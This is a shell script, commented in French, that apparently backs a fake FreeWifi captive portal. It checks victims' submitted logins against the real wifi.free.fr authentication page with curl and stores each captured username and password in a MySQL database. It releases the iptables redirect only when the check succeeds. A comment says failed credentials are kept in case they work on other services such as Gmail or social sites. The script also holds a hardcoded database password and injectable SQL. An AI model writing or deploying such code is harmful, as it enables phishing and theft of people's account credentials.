#/bin/sh

# Recuperation des parametres entrer dans auth.php
IdentFree=$1
PassFree=$2
#UserAgent=$3
#UserLang=$4
UserIp=$3

# interface wifi qui testera les identifiants
interfaceWlanX="wlan3"

# PATH

if [ ! -d "$UserIp" ]; then
	mkdir /var/www/$UserIp
fi

# Check interface up/down wlan3
#ifconfig | grep -q "$interfaceWlanX"

#if [ $? -eq 0 ]; then
#	ifconfig $interfaceWlanX up
#	iwconfig $interfaceWlanX essid "FreeWifi" channel 4
#fi

# envoiedes identifiants et mot de passe sur une vraie freebox pour vérification
test=`curl -s --interface wlan3 -L "https://wifi.free.fr/Auth" -d "login=$IdentFree&password=$PassFree&submit=Valider" | w3m -dump -T text/html | grep "REUSSIE"`
#--cookie-jar cookie.txt 
# si la valeur retournée est 0 soit que les id/pass sont valides
if [ "$test" == "REUSSIE" ]; then 

    # inject les id dans la base avec 1 dans le champ "validite"
	mysql -ptoor -e "use projetWifi; insert into free(IdentFree, PassFree, RemoteIp, validite) values('$IdentFree', '$PassFree', '$UserIp', 1);"
    
	# deconnection de l'ap freebox	
	#iwconfig $interfaceWlanX essid ""
	#ifconfig $interfaceWlanX down
	
	# on supprime les regles d'emprisonnement
	#removeNatRule=`iptables -t nat -vnL --line-numbers | grep $UserIp | awk '{print $1}' | uniq`				
	#for line in $removeNatRule; do
	iptables -t nat -D PREROUTING 1
	iptables -t nat -D PREROUTING 1
	#done

	
	# on cree le fichier 1 que auth.php va traiter
	touch /var/www/10.0.0.20/1
	
    # glisser une règle iptables pour enlever la redirection forcée vers le portail #
    exit 0
	
#sinon, inserer 0 dans le champs validité dans la BDD puis fin et reprise script de redirection vers page echec de la connexion
else  
	# on inject quand meme les id avec valid 0 soit non valide (mais peut etre pour un autre service web -gmail, social ...)
	#if [ -z "$UserAgent" ]; then
	#	UserAgent="NoUserAgent"
	#	mysql -ptoor -e "use projetWifi; insert into free(IdentFree, PassFree, RemoteIp, validite) values('$IdentFree', '$PassFree', '$UserIp', 0);"
	#fi

	mysql -ptoor -e "use projetWifi; insert into free(IdentFree, PassFree, RemoteIp, validite) values('$IdentFree', '$PassFree', '$UserIp', 0);"
	#echo "Identifiant incorrect"
	# 
	# 
    # on laisse la regle iptables de redirection vers le portail tant que les identifiants sont incorrectes
    exit 0
fi
exit 0
